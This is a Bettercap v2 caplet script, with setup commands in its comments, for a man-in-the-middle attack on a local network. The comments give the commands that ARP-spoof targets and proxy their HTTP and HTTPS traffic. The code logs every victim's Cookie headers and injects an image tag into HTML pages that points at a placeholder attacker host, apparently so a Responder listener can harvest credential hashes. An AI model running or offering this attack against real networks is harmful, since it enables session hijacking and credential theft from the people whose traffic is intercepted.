// Code mashed together from here: https://github.com/bettercap/caplets/
// Intended to use with Bettercap v2: https://github.com/bettercap/bettercap
//
// net.probe on
// sleep 1
// net.probe off
// set arp.spoof.targets <TARGETS>
// set https.proxy.script /root/caplets/responder-n-cookies.js
// set http.proxy.script /root/caplets/responder-n-cookies.js
// https.proxy on
// http.proxy on
// arp.spoof on
//

var RESET = "\033[0m";

function DIM(s) {
    return "\033[2m" + s + RESET;
}

function BOLD(s) {
    return "\033[1m" + s + RESET;
}

function R(s) {
    return "\033[31m" + s + RESET;
}

function B(s) {
    return "\033[34m" + s + RESET;
}

function onLoad() {
    log( "LETS GET SOME HASHES AND COOKIES." );
}

function onRequest(req, res) {
    log( BOLD(req.Client), " > ", B(req.Method), " " + req.Hostname + req.Path + ( req.Query ? "?" + req.Query : '') );
    for( var i = 0; i < req.Headers.length; i++ ) {
        var header = req.Headers[i];
        if( header.Name == "Cookie" ) {
            log( "  " + R(header.Name) + " : " + DIM(header.Value) );
        }
    }
}

function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        var body = res.ReadBody();
        if( body.indexOf('</body>') != -1 ) {
            res.Body = body.replace(
                '</body>',
                '<img src="http://<IP:PORT>/images/file.jpg" /></body>'
            );
            log( BOLD("HTML injected") );
        }
    }
}
